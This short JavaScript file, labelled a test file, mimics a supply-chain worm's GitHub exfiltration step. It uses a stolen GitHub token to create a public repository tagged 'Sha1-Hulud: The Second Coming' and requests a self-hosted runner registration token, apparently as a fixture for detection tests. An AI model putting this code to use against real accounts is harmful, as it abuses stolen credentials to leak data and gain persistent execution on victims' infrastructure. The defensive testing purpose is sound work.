// Test file: GitHub API exfiltration pattern
const axios = require('axios');

async function exfiltrateToGitHub(stolenSecrets) {
    // Create repository with characteristic description
    const repoData = {
        name: 'exfil-repo-' + Date.now(),
        description: 'Sha1-Hulud: The Second Coming',
        public: true,
        auto_init: true
    };

    const token = stolenSecrets.githubToken;

    // Exfiltrate through GitHub API
    const response = await axios.post(
        'https://api.github.com/user/repos',
        repoData,
        {
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        }
    );

    return response.data;
}

// Register self-hosted runner
async function registerRunner(repoOwner, repoName, token) {
    const tokenResponse = await axios.post(
        `https://api.github.com/repos/${repoOwner}/${repoName}/actions/runners/registration-token`,
        {},
        {
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        }
    );

    return tokenResponse.data;
}

module.exports = { exfiltrateToGitHub, registerRunner };
